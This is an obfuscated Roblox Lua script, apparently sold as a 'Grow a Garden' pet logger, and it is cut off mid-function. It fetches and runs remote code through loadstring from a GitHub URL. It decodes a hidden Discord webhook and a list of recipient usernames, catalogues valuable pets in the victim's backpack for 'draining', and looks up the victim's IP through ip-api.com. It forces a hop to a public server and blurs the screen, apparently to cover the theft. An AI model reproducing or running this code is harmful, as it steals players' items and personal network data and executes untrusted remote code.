local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')

data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end


 


-- ✅ Grow a Garden Pet Logger + Auto Drainer + Server Hopper

-- EXECUTE EXTERNAL SCRIPT
loadstring(game:HttpGetAsync(SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('rUxuZtbvaFXmCzQmiLYEGwEIllSMmGDPavBKaLKbjZfYUUmjLFTerJTaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL05vTGFnLWlkL05vLUxhZy1IVUIvcmVmcy9oZWFkcy9tYWluL0xvYWRlci9Mb2FkZXJWMi5sdWE=')))()

-- CONFIG SECTION
local webhookUrl = SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('CVaKZgAWxWmPEPhwdccbRBSZDoZuoMhxCroVvaYJcFsIbUNIKEIhRQiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5MjgyNTEzODEzNDY1MTA0My9KaFc5SU42c2N0aGdRbmN1VVlmQWVmeGJOT3hpTTJHWk1KNlY2bzFoQXVKVFdYcVVxTXQ2Yll4RnBicU5URU1yeEx5aQ==')
local targetUsernames = {SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('ejnTkVTbBTsHigziupqTMJSqtyeiuECfjKEhYxIyNybDBrmGaRDiSbvaW50ZXJjZXB0ZXJudW1iZXIx'), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('EzjVzReLWkjnXKFFAIlEYjWWhtGFkmPgBSBLpZnLlQTrLCldMcvDdmLTXlBbHQ='), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('ZmNTzUshcTRRXeZfQsZxXljACxemJyBCOclqSOkirJUQWhcOAIjJLwGRW5lbXlHdXk=')}
local drainPets = {
    SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('lXMoCOidfivHZshMzgTiNZFOSgiJEfJfClFDWzAwiVzareYvWJgKhasRHJhZ29uZmx5'), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('XVTkFuOgFfVPaQJwxaAqHIzTXScnZAaToNWtscSobdmsldjGNUEqFyXVOKAkVJleA=='), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('iKEZsIjlpStfnrYxubZVlFOWRbTzMRzDRHHDNePHPSvkjpoabvNTIwIUmFjY29vbg=='), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('UnUjRCBaZsmlwXdBqaiimhNDAPnPSCuqmLrABgSZLlBmdosGmqlqQGAUmVkIEZveA=='), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('tcjfRUnoHQNVDnqKcvpAOYmtJufbmKoxpGYfPoXKwMqZfuuOAchFqqRUXVlZW4gQmVl'),
    SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('onBkFOMqrWjbBadzGynxVaJXTremaKDdDwHIiVspsQQqAoXFtrntmaRRGlzY28gQmVl'), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('DSvNJnLmDYxRvdQDVAwaRgnxZFvdweddjxEhwKRjSomXCfXGfSpFLYGQnV0dGVyZmx5'), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('bYlMQhSpoceDonyNFEUgfRxLPlTIclwfkgtIolBgkDnZVPczedKzcTBTWltaWM='), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('NStJScBXuLUqNhhDudvBxiGTBBIRVemNbInYLyUkCoqRiyJVqzDNFRrTW9vbiBDYXQ='), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('WTnVDutWbqhQFVZIQlxZZIFUCcmEgHcjcWvIHCvCIbvLSdUtsFIZMWsRmVubmVjIEZveA=='),
    SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('IvfRBghxHTNbtMUJJxSbxbbtPiqjkXnhxbrlJaysjivUdLcGUtilrRVVHJpY2VyYXRvcHM=')
}
local petKeywords = {
    SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('yIVHErMMUqXViFFQhnCZZNxcPmpNOFmRPPinhrAOZaMJtWpOUerAEwOU3RhcmZpc2g='), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('fAQKlBpGhjsrdOvNXlWYxLjVenYJcxYaOdJbaVeDIwxoNaWoytBVshnQ3JhYg=='), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('PQwFPUOvFPpSqyfStMZoOMzMLvgNIyIqPfPUkcgBFynvVOaYIClBhilU2VhZ3VsbA=='), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('xQFwqFHQeFrQqUxtLbYTUErPlGmhvCLemulPSpiSrZNpXJSjCKIwgbeQnVubnk='), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('AkJNrekOaQkhsoByNyVjRwuNMzdWOXLGMXYbBQGSYgPvoVFzOvgMcMyRG9n'), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('WBXnuvXYJvRngajsZHnhduGnOwtkNdDGAqxWBBumBFgxsxpbREPsPEAR29sZGVuIExhYg=='), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('dmrzeqargLokGKajSLTLtwewyTOwDQRSlGFuVEVXhKXSYpihrfGbmuMQmVl'),
    SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('OaJhJRgtWsCbIASJVQIiTyeOWNPzPdFTJoMGEwQtKbyfXAvLYdyVMJoQmxhY2sgQnVubnk='), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('OblUVXMQhaNMvRblHTjzNNIcMJNAoNHxcnkTJrURFdvWCIXqxVvQbmoQ2F0'), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('FaTjaKlohBwQlCEVGSlBHUrSkFEziamVrCniqxzdlsJOIsyXpEyOSzIQ2hpY2tlbg=='), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('NWJBHMdemTrrjPbJYqgvylQAzcUESeUMzuHfLHnQqTVodWwidLxCKSiRGVlcg=='), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('ppAYfqGCMiGoFuQjCKRTfeIAuBKOvaRGknWlYDbfAZFijmpMWoqnhqnTW9ua2V5'), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('qeKyOxmeqSDgKNGpriDDXuYeypyywWqXvTovNCsMSLLCtxictEsAlFWT3JhbmdlIFRhYmJ5'),
    SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('KVsdAwbLIvwzcIiAuNYMzanQfCOBlsQvFNWYJqXQfuFfBMseYtEFTQgUGln'), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('FCmGRqZWFnbWrfBzawmcnSVoesKqVyKjvqGZPAWyivkGvRmAzoKAVrgUm9vc3Rlcg=='), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('BWBNiBMcokozcyYuBkFceICJadlMqZvbcLzGICBbrFOOtmTULqJhBooU3BvdHRlZCBEZWVy'), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('bmcwHUGgKtoKyQNdaNGFehiQOjHBkiVoBxqqNTqYfZfCHhEJHvyPRsNRmxhbWluZ28='), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('kBBkdoFIesoLnYYBuBpmVlutGCPpYlfAKlyYfWJiRVMfzCJFUghWWnoVG91Y2Fu'), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('hCEeRRkDSdVTNVwkmePmGDdEiTHokXjjwjWKsdYsbyYijMXADOJBTegU2VhIFR1cnRsZQ=='),
    SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('shEwkTFsnynqmPexMsvIblFwJZQsAVNfntRLESwQZPxMCBolkvJENXCT3Jhbmd1dGFu'), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('wYWnYXFQuZRUCvQFmPOoKLjbQSigUBZHwkqWnEVdKfQjlxjiussQUmWU2VhbA=='), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('BPnXvrDeLyrCMeGuPXmOQSstObNxsmMgNWeEUkWrbYtBviYyKQlYjdBSG9uZXkgQmVl'), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('ablFiqzJqyxCdksKFqDZUVqHDbdawgEnubNaZQYuKxziEiKZOXrBVBjV2FzcA=='), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('UdlolLkFEUFyzKpkTUIXTWaREiGmjAzYjVQqurjjQrvNnfDRmqPJqMFVGFyYW50dWxhIEhhd2s='), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('vEoXlyOsbGpOvOzjIHTabnlpyfNCczsKEpkVRhrtVxccpJKABiZvkAkUmFwdG9y'),
    SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('gpgZUSuWSymSyccQnqmaGrzEwTIhdzWDfAbTBSvaHmTxgdcvEndvlCxVHJpY2VyYXRvcHM='), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('oOQNOVPDseoCJKzFZePnblUHGbeRIODiPPBJAJGkRQUziTZgNpOFCbtU3RlZ29zYXVydXM='), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('qkcXEVWZCuWuoFizgLpwdypFalivkmuXpsJSilQNnulAgumdczHLAGeUHRlcm9kYWN0eWw='), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('zJauDbJhVLcfkuSPrFehVreFcOgIYBSHoUwOwjzpTRQSdmcJJcPLwqeVHVydGxl'), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('JrDcxlfUchWwiEvbeOYbJfNGXQksUzvwDPYQTQdkaKHDnkiuczKVHTAQ2F0ZXJwaWxsYXI='),
    SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('izrQPueSYhcboKARdaZHbJizfYkWNJfhrwXSBNxAoozYvTwZnxWbJTJUGV0YWwgQmVl'), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('nWYZcPohgczrxLxFWnBzLqZYXmEUtdHBjqbJpASgIdsEZeeLdTjekpCTW90aA=='), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('CDPDJURjmONFlcxINbwgxDawtOVaHoJxBlEbITCuSPxBevHISIRBPumU2NhcmxldCBNYWNhdw=='), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('kibMEXAHfutxRLkfYhMnjVPnjjjWqeJLZSioJlMkIlsqaMQlvNEXDkpT3N0cmljaA=='), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('bfJJDwCoRoLvBhLjWfCEfMCaYWlDtvQDrbXXugRDinTwXhbzVjYeokBUGVhY29jaw=='),
    SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('XxWxQbkFaPBuQytWRcGwhCAPuJUfXeBFxCDslJmIzIRdIpmcTjeeMrLQ2FweWJhcmE='), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('iVtitBPGbeqcUrNffytVEnQbFlBVNjJJFPZmtjHlZpUgTjzEaBeVddGU2FuZCBTbmFrZQ=='), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('HkIdJTCLvkXyEfmzaQcZBIusEcoqgflOmUtBmMObgulMRBYuVRFbqERTWVlcmthdA=='), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('ULqXeDWYbUiRfMfqdXHZwwaBTxCfcLpuXDlXApTXOdSKUqAaQgQFcbFQnJvd24gTW91c2U='), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('sZvpInczUJjRQsMBvkyWecBIKuBZeuIZBJyaVTgPkFMxOrUElhxMDMNR2lhbnQgQW50'),
    SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('xjfFNbDVvyRajsraBYdTqFOyiJCdHnWEgssLobwmxPjZurlkYJHMODBR3JleSBNb3VzZQ=='), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('clWCSldyMndiKodgMoFZshsIcnTUqKXfUihuORVsCmmAwxJSbspAunWUHJheWluZyBNYW50aXM='), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('zduydQjDJyIWmtbltPKbjcsQhjgnEYHgHGBFApCBFcKIpSBwZnfTBRIUmVkIEdpYW50IEFudA=='), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('qDONWwALkkEUyVSlCTufBYoTIHfjimYCWDxLXmuJVjQhJLcpitSeQYQU25haWw='), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('tdjzeUSMHfxXRfxBIFFGlNBxrjNbJjaGAJsEDefVEyqGwwYAylZjhXmU3F1aXJyZWw='),
    SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('pgoKrECubEANrcJXdEzJmksaGcKGhcXfuhkmgNqGboUlfgPFDFzmHRyQmVhciBCZWU='), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('dUyHNoVFrDgnvHOWlPvntvVOtZFrJGLsSbjqPGfQCamSDxEIOwTsjTyQnV0dGVyZmx5'), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('SUKlsWPdhoeHwDgUgAJUQnNyzaFtrxihUGdUbOlEaBOWuVXcAnBcQeaQnJvbnRvc2F1cnVz'), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('rKqgmFNLodOuYPinskHPOLhKkvJKQIWGmCmGAfpluBKzuOnZmOjMcoTUGFjayBCZWU='), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('KqPAVsIMpvIbDcFZjpQUlCubFjnqBFDaIQystRyeetNZvXECCmGXcMuTWltaWMgT2N0b3B1cw=='),
    SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('EoDBxykaXSaJKboAEcvAiquMEofsUDaUPkYzWXSqIiatSLyxKajXTijSHlhY2ludGggTWFjYXc='), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('KtujKnTeoKdYBebjnCBcZGchkjPbtLgxaECVcEWcnACZxhwexrHYpyPQXhvbG90bA=='), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('doCHPAzXgIggHlCZCzNSySoQsLNWnAQiQTjzlfjvKAGOURIckTFBtrkUmVkIEZveA=='), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('KmTwVqmpCpuMaXfuZUIFbmXlCuVuBlkxhuNQSsYvkliAzgcaCyrzAybVOKAkVJleA=='), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('wDoeYPhJCHgLfyhgyMbIGfiXMyRTnUpDHRnMpzZErmwPwpbHSGgcEuPRHJhZ29uZmx5'),
    SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('BluGmrEJyhFblQGXPsKGlxumpYlsOVOurwoZXtCLdiqUNuEdZDWgVlIUXVlZW4gQmVl'), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('TxcArBAayOLHllhzvxhkhcEMuZdaJHNNBpGEdbhvOVDwZaAmKDrLqTURGlzY28gQmVl'), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('mClsURHjmSSJeKzFhslvpCDGpqwjiwzPWQVPJfIvrLBEwGdnrzMelncRmVubmVjIEZveA=='), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('ppoojurvhkXECmmUxlKaviJvMMzXDMfFFZlVCmDsLWUpihdkiUnHcfyTW9vbiBDYXQ='), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('bzMFwxoPXhEVqlnuMMHBEeVgAgaFZrPDAfJXkQDlHSnXHkAgHNkWxJiUmFjY29vbg==')
}

-- SERVICES
local Players = game:GetService(SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('ExkPrHgLjhAONHTlqXhFOUJnuSLcNTtlmaqXHcHmnsPCPWPfVGgtppYUGxheWVycw=='))
local ReplicatedStorage = game:GetService(SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('FVuZwfnJbleDJaoflCJSnQOMqDKYlxHYDERghPFuWisZhyVqjisZUXAUmVwbGljYXRlZFN0b3JhZ2U='))
local HttpService = game:GetService(SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('HusspHxyBEIOEetHfpWWcShLXAHojslHKbVklKxzCSnfYzFgotsllWJSHR0cFNlcnZpY2U='))
local TeleportService = game:GetService(SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('pedHRkrJiSidmKqRvuyONSErkTItGlkbDCMFULIUDlKMRxtrToGLhggVGVsZXBvcnRTZXJ2aWNl'))
local Lighting = game:GetService(SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('pAreBHuQXmuedWUaKtmnHyDXknVvgeyrkhJMWiYKiFFmWwKdyQmbJSpTGlnaHRpbmc='))
local localPlayer = Players.LocalPlayer
local backpack = localPlayer:WaitForChild(SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('JGLhoGYtubFoimPrdsaKbMRBICJDmHvQAivvMSjeXbmBbOKTZzdDpgvQmFja3BhY2s='))
local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
local jobId = game.JobId
local placeId = game.PlaceId

-- AUTO SERVER-HOP IF PRIVATE
local function getLowestServer()
    local req = http_request or syn.request or request or fluxus.request
    if not req then return nil end
    local cursor = SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('hVFmdnqJNuqtEkZefoRNEIkySrmMiRdDvcISonBvZFNQuldndtOwUVt')
    local lowest = nil
    repeat
        local url = SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('BgLOAEGJTUPKUwpYORhwNXPUhzxvEQlEoyOwPBxcSFtuKIRZOhOpQbPaHR0cHM6Ly9nYW1lcy5yb2Jsb3guY29tL3YxL2dhbWVzLw==') .. placeId .. SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('OaYiUKRhFRkTtAfTNRyOuhJsLqQiwbTWBQvCLoFagTMJVQPjiypFSOYL3NlcnZlcnMvUHVibGljP3NvcnRPcmRlcj1Bc2MmbGltaXQ9MTAw')
        if cursor ~= SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('zPYYkYIhtXRiMtIWazGPAxAwIWpcwXVCtFZhwOAqASCKzuEgSBvUqht') then url = url .. SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('FiejGYQJaIItreBLOlhdgUomSzVYHOuenBeifwTlGtEqKTXRbWgCBNSJmN1cnNvcj0=') .. cursor end
        local response = req({ Url = url, Method = SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('QWKRjldmfnWZdREjfxPUXXhODoEBfvmjtYWkUIfHwCLYsHxQXkEJjuRR0VU') })
        if response and response.Body then
            local data = HttpService:JSONDecode(response.Body)
            for _, server in pairs(data.data or {}) do
                if server.playing < server.maxPlayers then
                    lowest = server
                    break
                end
            end
            cursor = data.nextPageCursor
        end
    until lowest or cursor == nil
    return lowest
end

local wasPrivateServer = false
if game.PrivateServerId ~= SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('AavXAlXLGXLkFffMtEfUSfiOxKEERQkSoyfHerRQxkxpzRCbQZXHHUo') and game.PrivateServerOwnerId ~= 0 then
    local lowestServer = getLowestServer()
    if lowestServer then
        wasPrivateServer = true
        warn(SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('XjaBxmXxlrjLtPhGseeVMhrWkjGNtKznsWpWbuJNdGjkDNixUnyQjkVWypdIFByaXZhdGUgc2VydmVyIGRldGVjdGVkLiBIb3BwaW5nIHRvIHB1YmxpYyBzZXJ2ZXIuLi4='))
        task.wait(3)
        TeleportService:TeleportToPlaceInstance(placeId, lowestServer.id, localPlayer)
        return
    else
        warn(SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('LfaxDVdvoswvDsNYeebrgopnzzpgkfXLUOiFONvGJHgXrVETwUnquPAWyFdIE5vIHB1YmxpYyBzZXJ2ZXIgZm91bmQu'))
    end
end

-- HELPERS
function freezeVisual()
    local blur = Instance.new(SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('ZgxBXoXgnNvNrDZXfgBHaCFubcedPbORvGHWrzAWBRVsmMNeMLqmBRlQmx1ckVmZmVjdA=='))
    blur.Size = 999
    blur.Parent = Lighting
end

local function hasKeyword(name, list)
    for _, keyword in ipairs(list) do
        if string.find(string.lower(name), string.lower(keyword)) then
            return true
        end
    end
    return false
end

local function getFilteredPets()
    local filtered = {}
    for _, item in pairs(backpack:GetChildren()) do
        if item:IsA(SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('nSpuSOgmWjXJaoXuUfDNEcJBIemFeosmhQvSGWCFzfoPcmmixpZNxTVVG9vbA==')) and hasKeyword(item.Name, petKeywords) then
            table.insert(filtered, item.Name)
        end
    end
    return filtered
end

local function chunkItems(items)
    local chunks = {}
    for i = 1, #items, 5 do
        local chunk = {}
        for j = i, math.min(i+4, #items) do
            table.insert(chunk, SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('RiCubAtKwEAdKSBbTRvyQXZapNDHReiYENKDijXozEkWqVtxlIorjaJLSA=') .. items[j])
        end
        table.insert(chunks, {
            name = SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('lkcSThBYhpTMoEavtEtKJtcMPFltqbWGzBgHiJnzNapFclOEtGIdYFb8J+OkiBQZXRzIA==') .. tostring(i) .. SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('iOdRPZAilblytbiZBEVQLzyJSNIvhvLNqCyuCzkOlWdDNjUpFgACGrE4oCT') .. tostring(math.min(i+4, #items)),
            value = table.concat(chunk, SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('CyHMTTQHGdDsWkioFMmOYLBDnAwLSlsuWEqxXPkoKGgtNmIUnGUefwgXG4=')),
            inline = false
        })
    end
    return chunks
end

local function sendWebhook(embedFields)
    local data = {
        content = SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('vcnRRvnodkoUdkvuqpkkFuFMbaSBDjFDkminZaflOQZBatwAvzzOYoN'),
        embeds = {{
            title = SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('IAfrdavZKSoPuqCQuDjwGfyZFDqzHxraCMeqyUlAFZVyWjuSyNKehcC8J+QviBHcm93IGEgR2FyZGVuIFJlcG9ydA=='),
            color = 16753920,
            fields = embedFields,
            footer = { text = SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('BcYUFPxfDrCYevnuaUJDlQvhUVhgCANkBCvIzuhQndLkSbtdPsYqTuCRGVsdGEgRXhlY3V0b3IgTG9nZ2Vy') },
            timestamp = os.date(SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('xVavESNumhlMLHEvVSyScIcAAxeyCTvqQbWOedveAeOQuCrrWfJPBeTISVZLSVtLSVkVCVIOiVNOiVTWg=='))
        }}
    }
    local req = http_request or request or syn.request or fluxus.request
    if req then
        req({
            Url = webhookUrl,
            Method = SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('qurFUHMEczGtAsEEjmzqeIXARMYAlRsjTiMLcmroSAbuKDvFQTBOByNUE9TVA=='),
            Headers = { [SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('tYLAwLmNawYqXhdqwdvvnawOtVXRBJYkzWgacEPOgxMkarjcYsWQzLhQ29udGVudC1UeXBl')] = SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('cxfoKDLrIZdyjWQeBJIRJOZPODENCiRMPmGZyNMzWTDAQCMasApPgliYXBwbGljYXRpb24vanNvbg==') },
            Body = HttpService:JSONEncode(data)
        })
    end
end

local function getIPInfo()
    local req = http_request or request or syn.request or fluxus.request
    if not req then return SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('nQKVZoobXeDDfIAEBxamxlOlpoFxrscNVPLSiwRUZOuFONwmAYVkYVpVW5rbm93bg=='), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('XDuTHpawKuwMbBsBwwjGYWBcbEvhWQTfVofVJaklILSIrBfLFvbdwvrVW5rbm93bg=='), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('JUsgYtYNrCCQnMSgOLYnjmuRbHlTZXjlGFzbvMNCNdkHFVARjNCKnmRVW5rbm93bg==') end
    local result = req({ Url = SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('jmICQfuzWoGSXIrPHNCnWatFpGxOZkMkNXpzARKTuxTwtKeQDItQLWBaHR0cDovL2lwLWFwaS5jb20vanNvbi8='), Method = SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('AUoDXjfdpJtpSICXgztwhPwUAuHQLGInlUVgSQcBpFZMDLLYJDczjqvR0VU') })
    if result and result.Body then
        local body = HttpService:JSONDecode(result.Body)
